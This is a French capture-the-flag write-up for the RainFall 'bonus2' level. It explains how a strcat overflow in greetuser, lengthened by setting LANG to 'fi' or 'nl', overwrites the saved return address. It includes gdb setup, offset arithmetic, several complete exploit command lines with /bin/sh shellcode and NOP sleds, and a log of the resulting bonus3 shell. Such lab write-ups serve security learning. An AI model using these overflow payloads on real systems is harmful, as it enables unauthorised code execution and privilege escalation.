# bonus02

Vu que l on a la protection "GCC stack protector support" d'activer, nous devons utiliser la ligne suivante dans gdb afin de garder des adresses coherentes avec une utilisation sans gbd:
set exec-wrapper env -u LINES -u COLUMNS

Si argc n'est pas egal a 3, le programme se termine et retourne 1 (main+15)

set exec-wrapper env -i LANG="fi"

bonus2@RainFall:~$ echo $LANG
fi

A greetuser+147 nous avons un strcat() avec l adresse de la destination a 0xbffff260 et save $eip a l adresse 0xbffff2ac, ce qui nous permet d'ecraser sa valeur si l'adresse de destination atteint 80 bytes (0xbffff2ac-0xbffff260 = 76 + les 4 bytes de l'adresse a overwrite) et ne pas retourner a main+263, mais sur l adresse de notre shellcode

Seul 40 bytes du premier argument et 32 bytes du deuxieme argument seront copier dans l'adresse de destination, ce qui fait 72 bytes d'ecriture possible dans nos argument du main, il nous manque donc 8 bytes pour ecraser $eip.

Si la varible d'environnement LANG vaut "fi", nous aurons une string de 19 bytes dans l'adresse de destination du strcat ce qui nous fera 98 bytes, nous pourrons donc ecraser $eip.

Si la varible d'environnement LANG vaut "nl", nous aurons une string de 14 bytes dans l'adresse de destination du strcat ce qui nous fera 92 bytes, nous pourrons donc ecraser $eip.

Si la varible d'environnement LANG vaut une autre valeur, nous aurons une string de 6 bytes dans l'adresse de destination du strcat ce qui nous fera 78 bytes, nous ne pourrons donc pas ecraser $eip, et le challenge ne pourra pas etre resolue avec notre methode.

Nous avons donc plusieurs solutions pour ce challenge:

export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") && export LANG="fi" && ./bonus2 $(python -c 'print "A" * 4000') $(python -c 'print "B" * 18 + "\x78\xf7\xff\xbf"')

export LANG="fi" && ./bonus2 $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 18 + "\xff\xf4\xff\xbf"')

export LANG="nl" && ./bonus2 $(python -c 'print "A" * 4000') $(python -c 'print "B" * 23 + "\x78\xf7\xff\xbf"')

export LANG="nl" && ./bonus2 $(python -c 'print "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') $(python -c 'print "B" * 23 + "\xff\xf4\xff\xbf"')

bonus2@RainFall:~$ export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x78\xf7\xff\xbf"')Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB���
$ whoami
bonus3
$ echo "You are the bonus3 user"
You are the bonus3 user
$


Premier argument du main dans le main: 0xbfffd836
	Dans la fonction greetuser: 0xbfffd5a0

Le tout dans greetuser: 0xbffff462

0xbffff4f0


r $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x1e\xf5\xff\xbf" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

